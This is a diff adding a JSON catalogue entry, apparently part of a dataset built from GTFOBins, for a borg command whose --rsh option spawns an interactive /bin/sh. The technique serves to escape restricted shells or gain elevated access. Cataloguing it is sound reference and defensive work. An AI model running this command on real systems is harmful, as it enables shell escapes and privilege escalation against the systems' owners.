@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-borg-shell",
+  "name": "GTFOBins · borg (shell)",
+  "command": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\"",
+  "description": "Use borg to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "borg",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/borg/#shell",
+  "upstream_id": "borg/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/borg/"
+    }
+  ]
+}
